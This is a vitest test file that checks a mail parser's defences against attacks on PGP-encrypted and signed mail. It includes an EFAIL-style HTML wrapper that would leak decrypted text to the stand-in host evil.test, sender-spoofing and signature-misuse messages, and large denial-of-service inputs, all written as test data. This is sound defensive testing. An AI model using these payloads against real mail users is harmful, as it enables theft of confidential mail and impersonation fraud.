// The published attacks on encrypted and signed mail, against wave 3 (docs/proposals/sinter-mail-mime.md, sections
// 5 to 7 and Pitfalls): EFAIL, re-wrapped and re-sent ciphertexts, partial signing, stale results, armor that is not
// a step, blocking problems under a signature, Content-IDs across protection boundaries; and time bounds for hostile
// inputs with many steps.
import { beforeAll, describe, expect, test } from 'vitest';
import { mime } from '../sinter/mime.js';
import { all, problem, reader, scan } from '../sinter/mime/index.js';
import type { Part, Step } from '../sinter/mime/types.js';
import {
  addrs, App, clearsign, codes, crlf, detach, eml, encrypt, key, multipart, pgpMime, pgpSigned, read, texts, unlock, utf8, type Keys,
} from './mime-crypto-kit.js';

let alice: Keys, bob: Keys, mallory: Keys, app: App;
beforeAll(async () => {
  [alice, bob, mallory] = await Promise.all([key('Alice', 'alice@example.test'), key('Bob', 'bob@example.test'), key('Mallory', 'mallory@evil.test')]);
  app = new App(bob, [alice, bob, mallory]);
});

const ALICE = ['From: Alice <alice@example.test>', 'To: bob@example.test', 'Subject: ...'];
const MALLORY = ['From: Mallory <mallory@evil.test>', 'Reply-To: mallory@evil.test', 'To: bob@example.test', 'Subject: ...'];
const encEntity = (armor: string) => multipart('multipart/encrypted; protocol="application/pgp-encrypted"', 'e',
  ['Content-Type: application/pgp-encrypted', '', 'Version: 1'], ['Content-Type: application/octet-stream', '', armor]);

describe('EFAIL', () => {
  test('a decrypt result without integrity shows nothing; a "ciphertext" that is only a signed message is refused by the app', async () => {
    const raw = pgpMime(ALICE, await encrypt(crlf('Content-Type: text/html\n\n<img src="https://evil.test/?'), bob));
    const id = mime(raw).steps[0]!.id;
    const real = await app.decrypt(utf8(raw.slice(raw.indexOf('-----BEGIN PGP MESSAGE'))));
    const m = mime(raw, { decrypted: { [id]: { ...real, integrity: false } } });
    expect(m.parts).toMatchObject([{ type: 'encrypted', reason: 'failed' }]);
    expect(m.attachments).toEqual([]);
    expect(m.problems).toEqual([{ code: 'integrity', part: '1', blocking: true }]);
    expect(m.summary.encrypted).toBe('none');
    const { sign, createMessage } = await import('openpgp');
    const signedOnly = await sign({ message: await createMessage({ text: 'not encrypted' }), signingKeys: alice.privateKey });
    expect(await app.decrypt(utf8(signedOnly as string))).toEqual({ status: 'failed', integrity: false });
  });

  test('attacker HTML around an opened ciphertext: bodies never joined, the opened part its own block', async () => {
    const raw = eml(...MALLORY, ...multipart('multipart/mixed', 'm', ['Content-Type: text/html', '', '<img src="https://evil.test/?'],
      encEntity(await encrypt(crlf('Content-Type: text/plain\n\nsecret'), bob)), ['Content-Type: text/html', '', '">']));
    const p = mime(raw).parts[1] as Part & { type: 'encrypted' };
    const o = await read(raw, app, [p.step]);
    expect(texts(o)).toEqual(['<img src="https://evil.test/?', 'secret', '">']);
    expect(o.parts.map((x) => x.protection.encrypted)).toEqual([false, true, false]);
  });
});

describe('re-wrapped and re-sent ciphertexts', () => {
  test('an old ciphertext re-wrapped in another sender\'s multipart/mixed: not-root, no step; the original\'s result is stale', async () => {
    const armor = await encrypt(crlf('Content-Type: text/plain\n\nfor Bob only'), bob);
    const original = pgpMime(ALICE, armor);
    const results = await unlock(original, app);
    const wrapped = eml(...MALLORY, ...multipart('multipart/mixed', 'm', ['Content-Type: text/plain', '', 'please quote this back'], encEntity(armor)));
    const m = mime(wrapped, results);
    expect(m.steps).toEqual([]);
    expect(m.parts).toMatchObject([{ type: 'text' }, { type: 'encrypted', reason: 'not-root' }]);
    expect(codes(m)).toEqual(['stale-result']);
    expect(m.summary).toEqual({ encrypted: 'none', signed: 'none', from: null });
    // the same ciphertext in a list footer around it: not-root too
    const footer = mime(eml(...ALICE, ...multipart('multipart/mixed', 'm', encEntity(armor), ['Content-Type: text/plain', '', '-- list'])));
    expect(footer.parts).toMatchObject([{ type: 'encrypted', reason: 'not-root' }, { type: 'text' }]);
  });

  test('re-sent as a new root with the attacker\'s From and Reply-To (hp): Reply-To empty, From outer, differs, reply to the author', async () => {
    const payload = crlf('Content-Type: text/plain; hp="cipher"\nFrom: Alice <alice@example.test>\nTo: bob@example.test\nSubject: Q3 numbers\n\nconfidential');
    const m = await read(pgpMime(MALLORY, await encrypt(payload, bob)), app);
    expect(texts(m)).toEqual(['confidential']);
    expect([addrs(m.headers.from), m.headers.replyTo, m.sources.from, m.sources.replyTo]).toEqual([['mallory@evil.test'], [], 'outer', 'protected']);
    expect(addrs(m.reply)).toEqual(['alice@example.test']);
    expect(m.summary).toEqual({ encrypted: 'all', signed: 'none', from: 'differs' });
    expect(m.headers.subject).toBe('Q3 numbers');
  });

  test('the same with protected-headers="v1": Reply-To only from the payload, other fields field by field', async () => {
    const payload = crlf('Content-Type: text/plain; protected-headers="v1"\nFrom: Alice <alice@example.test>\nSubject: Q3 numbers\n\nconfidential');
    const m = await read(pgpMime(MALLORY, await encrypt(payload, bob)), app);
    expect([m.headers.replyTo, addrs(m.headers.to), m.sources.to, m.headers.subject]).toEqual([[], ['bob@example.test'], 'outer', 'Q3 numbers']);
    expect(addrs(m.reply)).toEqual(['alice@example.test']);
    expect(m.summary.from).toBe('differs');
    expect(m.confidential).toEqual(['from', 'subject']);
  });

  test('without protected headers the reply goes to the outer sender, and from is not matches', async () => {
    const m = await read(pgpMime(MALLORY, await encrypt(crlf('Content-Type: text/plain\n\nold'), bob)), app);
    expect([addrs(m.reply), m.summary.from]).toEqual([['mallory@evil.test'], 'unknown']);
  });

  test('a signed and encrypted ciphertext re-sent: the signature binds the protected From, which is shown', async () => {
    const payload = crlf('Content-Type: text/plain; hp="cipher"\nFrom: Alice <alice@example.test>\nSubject: signed\n\nby alice');
    const m = await read(pgpMime(MALLORY, await encrypt(payload, bob, alice)), app);
    expect([addrs(m.headers.from), m.sources.from, m.summary]).toEqual([['alice@example.test'], 'protected', { encrypted: 'all', signed: 'all', from: 'matches' }]);
    expect(m.outer.from.map((a) => a.address)).toEqual(['mallory@evil.test']);
  });

  test('encryption alone proves nothing about the author: an encrypted From ceo@ without a signature is not shown', async () => {
    const payload = crlf('Content-Type: text/plain; hp="cipher"\nFrom: CEO <ceo@example.test>\n\nwire the money');
    const m = await read(pgpMime(MALLORY, await encrypt(payload, bob)), app);
    expect([addrs(m.headers.from), m.summary.from]).toEqual([['mallory@evil.test'], 'differs']);
  });
});

describe('partial signing', () => {
  test('a signed part and an unsigned footer: some', async () => {
    const part = 'Content-Type: text/plain\r\n\r\nsigned by alice';
    const signed = eml(...multipart('multipart/signed; protocol="application/pgp-signature"', 's', [part], ['Content-Type: application/pgp-signature', '', await detach(part, alice)])).replace(/\r\n$/, '');
    const m = await read(eml(...ALICE, ...multipart('multipart/mixed', 'm', [signed], ['Content-Type: text/plain', '', 'added by mallory'])), app);
    expect(m.parts.map((p) => p.protection.signed)).toEqual(['good', null]);
    expect(m.summary).toEqual({ encrypted: 'none', signed: 'some', from: 'unknown' });
  });

  test('a genuine signed snippet pasted into a reply: only that part is signed', async () => {
    const snippet = await clearsign('I agree to the terms.', alice);
    const raw = eml(...MALLORY, 'Content-Type: text/plain', '', 'Alice wrote, and signed, that she owes me $10,000:', snippet, 'So pay up.');
    const m = await read(raw, app);
    expect(m.parts.map((p) => [p.id, p.protection.signed])).toEqual([['1:1', null], ['1:2', 'good'], ['1:3', null]]);
    expect(m.summary).toEqual({ encrypted: 'none', signed: 'some', from: 'unknown' });
    expect(addrs(m.headers.from)).toEqual(['mallory@evil.test']);
  });
});

describe('stale results and armor that is no step', () => {
  test("a verdict for another message's step id is ignored (stale-result, once, part null)", async () => {
    const part = 'Content-Type: text/plain\r\n\r\none';
    const a = pgpSigned(ALICE, part, await detach(part, alice));
    const b = pgpSigned(ALICE, part.replace('one', 'two'), await detach(part, alice));
    const results = await unlock(a, app);
    const m = mime(b, { ...results, verdicts: { ...results.verdicts, extra: [{ status: 'good' }] } });
    expect(m.parts[0]!.protection.signed).toBe('pending');
    expect(m.problems).toEqual([{ code: 'stale-result', part: null, blocking: false }]);
  });

  test('a quoted cleartext block makes no step and no problem', async () => {
    const block = await clearsign('quoted', alice);
    const m = mime(eml(...ALICE, 'Content-Type: text/plain', '', 'You wrote:', ...block.split('\r\n').map((l) => '> ' + l)));
    expect([m.steps, m.problems, m.parts.length]).toEqual([[], [], 1]);
  });

  test('an extra armor header, or a line starting - not dash-escaped: armor-headers, no step, the text as it is', async () => {
    const block = await clearsign('hello', alice);
    const extra = mime(eml(...ALICE, 'Content-Type: text/plain', '', block.replace(/^(Hash: \w+)/m, '$1\r\nComment: hidden')));
    expect([extra.steps, codes(extra), extra.parts.length]).toEqual([[], ['armor-headers'], 1]);
    expect(texts(extra)[0]).toContain('Comment: hidden');
    const dash = mime(eml(...ALICE, 'Content-Type: text/plain', '', block.replace('hello', 'hello\r\n-not escaped')));
    expect([dash.steps, codes(dash)]).toEqual([[], ['armor-headers']]);
  });

  test('a stale open id matches nothing in another message', () => {
    const m = mime(eml(...ALICE, 'Content-Type: text/plain', '', 'x'), { open: ['1.2#00112233445566778899aabbccddeeff'] });
    expect(codes(m)).toEqual(['stale-result']);
  });
});

describe('blocking problems under a signature: signed null', () => {
  const sign = async (inner: string) => pgpSigned(ALICE, inner, await detach(inner, alice));

  test('a duplicate Content-Type inside the signed part: no step', async () => {
    const inner = eml(...multipart('multipart/mixed', 'in', ['Content-Type: text/plain', 'Content-Type: text/html', '', 'x'], ['Content-Type: text/plain', '', 'y'])).replace(/\r\n$/, '');
    const m = await read(await sign(inner), app);
    expect(m.steps).toEqual([]);
    expect(m.parts.map((p) => p.protection)).toEqual([{ encrypted: false, signed: null }, { encrypted: false, signed: null }]);
  });

  test('base64 padding mid-stream in an attachment under the signature: blocking, no step, nothing labelled', async () => {
    const inner = eml(...multipart('multipart/mixed', 'in', ['Content-Type: text/plain', '', 'body'],
      ['Content-Type: application/pdf; name="a.pdf"', 'Content-Disposition: attachment', 'Content-Transfer-Encoding: base64', '', 'QUJD', 'REVG', '=', 'R0hJ'])).replace(/\r\n$/, '');
    const m = await read(await sign(inner), app);
    expect(m.steps).toEqual([]);
    expect(m.problems).toContainEqual({ code: 'base64-junk', part: '1.1.2', blocking: true });
    expect([m.parts[0]!.protection.signed, m.attachments[0]!.protection.signed, m.summary.signed]).toEqual([null, null, 'none']);
  });

  test('a crypto-shape problem found while showing the signed subtree (a malformed multipart/encrypted): no step', async () => {
    const inner = eml(...multipart('multipart/mixed', 'in', ['Content-Type: text/plain', '', 'body'],
      ['Content-Type: multipart/encrypted; protocol="application/pgp-encrypted"; boundary=e', '', '--e', 'Content-Type: text/plain', '', 'not version', '--e--'])).replace(/\r\n$/, '');
    const m = await read(await sign(inner), app);
    expect(m.steps).toEqual([]);
    expect(m.problems).toContainEqual({ code: 'crypto-shape', part: '1.1.2', blocking: true });
    expect(m.parts[0]!.protection.signed).toBe(null);
  });

  test('a blocking problem recorded while showing is near crypto: blocking, above below it, below above it', () => {
    const src = utf8(eml(...ALICE, ...multipart('multipart/mixed', 'm', ['Content-Type: multipart/mixed; boundary=n', '', '--n', '', 'x', '--n--'])));
    const s = scan(src);
    const r = reader(new Map([['input', src]]), [], 'html');
    const [root, mid, leaf] = all(s.root);
    expect([root!.below, mid!.above, leaf!.above]).toEqual([false, false, false]);
    problem(r, mid!, 'crypto-shape', true);
    expect([mid!.blocking, root!.below, root!.above, leaf!.above, mid!.below]).toEqual([['crypto-shape'], true, false, true, true]);
  });

  test('a malformed PGP multipart/signed (three parts): crypto-shape, shown as multipart/mixed, no step', () => {
    const m = mime(eml(...ALICE, ...multipart('multipart/signed; protocol="application/pgp-signature"', 's', ['', 'a'], ['', 'b'], ['Content-Type: application/pgp-signature', '', 's'])));
    expect([m.steps, texts(m)]).toEqual([[], ['a', 'b']]);
    expect(m.problems).toEqual([{ code: 'crypto-shape', part: '1', blocking: true }]);
  });

  test('a blocking problem above a multipart/encrypted at the root: no step, one attachment of its bytes', () => {
    const m = mime(eml(...ALICE, 'Content-Transfer-Encoding: 7bit', 'Content-Transfer-Encoding: 8bit', ...encEntity('-----BEGIN PGP MESSAGE-----')));
    expect(m.steps).toEqual([]);
    expect(m.problems).toContainEqual({ code: 'duplicate-field', part: '1', blocking: true });
    expect(m.attachments).toMatchObject([{ kind: 'encrypted' }]);
  });
});

describe('Content-ID images across protection boundaries', () => {
  test('a signed HTML body cannot take its image from outside the signature', async () => {
    const html = 'Content-Type: text/html\r\n\r\n<img src="cid:logo">';
    const signed = eml(...multipart('multipart/signed; protocol="application/pgp-signature"', 's', [html], ['Content-Type: application/pgp-signature', '', await detach(html, alice)])).replace(/\r\n$/, '');
    const m = await read(eml(...ALICE, ...multipart('multipart/mixed', 'm', [signed], ['Content-Type: image/png', 'Content-ID: <logo>', '', 'png'])), app);
    expect(m.parts).toMatchObject([{ type: 'html', inline: [], protection: { signed: 'good' } }]);
    expect(m.attachments).toMatchObject([{ contentId: 'logo', protection: { signed: null } }]);
  });

  test('an unencrypted HTML body cannot take its image from an opened part, and an opened body none from outside', async () => {
    const payload = crlf('Content-Type: multipart/related; boundary=r\n\n--r\nContent-Type: text/html\n\n<img src="cid:in">\n--r\nContent-Type: image/png\nContent-ID: <in>\n\npng\n--r--\n');
    const raw = eml(...ALICE, ...multipart('multipart/mixed', 'm', ['Content-Type: text/html', '', '<img src="cid:in"><img src="cid:out">'],
      encEntity(await encrypt(payload, bob)), ['Content-Type: image/png', 'Content-ID: <out>', '', 'png']));
    const p = mime(raw).parts[1] as Part & { type: 'encrypted' };
    const m = await read(raw, app, [p.step]);
    const [outer, opened] = m.parts as (Part & { type: 'html' })[];
    expect(outer!.inline).toEqual([{ contentId: 'out', attachment: '1.3' }]);
    expect(opened!.inline.map((i) => i.contentId)).toEqual(['in']);
  });
});

describe('time bounds for hostile inputs with many steps', () => {
  const bound = (f: () => unknown, ms = 1000) => { const t = performance.now(); f(); expect(performance.now() - t).toBeLessThan(ms); };
  const sig = (n: number) => multipart('multipart/signed; protocol="application/pgp-signature"', `s${n}`, ['', `part ${n}`], ['Content-Type: application/pgp-signature', '', 'sig']);

  test('300 signed parts: at most 16 steps, the rest unlabelled with a limit problem', () => {
    const raw = eml(...ALICE, ...multipart('multipart/mixed', 'm', ...Array.from({ length: 300 }, (_, i) => sig(i))));
    let m!: ReturnType<typeof mime>;
    bound(() => { m = mime(raw); });
    expect(m.steps.length).toBe(16);
    expect(m.parts.filter((p) => p.protection.signed === 'pending').length).toBe(16);
    expect(m.problems).toContainEqual({ code: 'limit', part: '1.17', blocking: true });
  });

  test('100,000 BEGIN lines without an END, and 50,000 armor-looking quoted lines: no step, linear', () => {
    bound(() => expect(mime(eml(...ALICE, 'Content-Type: text/plain', '', ...Array(100_000).fill('-----BEGIN PGP SIGNED MESSAGE-----'))).steps).toEqual([]));
    bound(() => expect(mime(eml(...ALICE, 'Content-Type: text/plain', '', ...Array(50_000).fill('> -----BEGIN PGP MESSAGE-----'))).steps).toEqual([]));
    bound(() => expect(mime(eml(...ALICE, 'Content-Type: text/plain', '', '-----BEGIN PGP MESSAGE-----', ...Array(100_000).fill('-----BEGIN PGP MESSAGE-----'))).steps).toEqual([]));
  });

  test('200 not-root ciphertexts all opened with results: at most 16 steps, the rest over-limit', async () => {
    const parts = Array.from({ length: 200 }, (_, i) => encEntity(`-----BEGIN PGP MESSAGE-----\r\n\r\nx${i}\r\n-----END PGP MESSAGE-----`));
    const raw = eml(...ALICE, ...multipart('multipart/mixed', 'm', ['', 'intro'], ...parts));
    const ids = mime(raw).parts.filter((p): p is Part & { type: 'encrypted' } => p.type === 'encrypted').map((p) => p.step);
    expect(ids.length).toBe(200);
    const decrypted = Object.fromEntries(ids.map((id) => [id, { status: 'ok' as const, integrity: true, plaintext: utf8('Content-Type: text/plain\r\n\r\nopened') }]));
    let m!: ReturnType<typeof mime>;
    bound(() => { m = mime(raw, { open: ids, decrypted }); });
    expect(m.steps.length).toBe(16);
    expect(m.parts.filter((p) => p.type === 'encrypted' && p.reason === 'over-limit').length).toBe(184);
  });

  test('a decrypted payload that decrypts to itself many times is bounded by the steps and the budget', () => {
    const inner = eml(...encEntity('-----BEGIN PGP MESSAGE-----'));
    const raw = eml(...ALICE, ...encEntity('-----BEGIN PGP MESSAGE-----'));
    const id = mime(raw).steps[0]!.id;
    const m = mime(raw, { decrypted: { [id]: { status: 'ok', integrity: true, plaintext: utf8(inner) } } });
    expect(m.steps.map((s: Step) => s.part)).toEqual(['1', `${id}/1`]);
  });
});
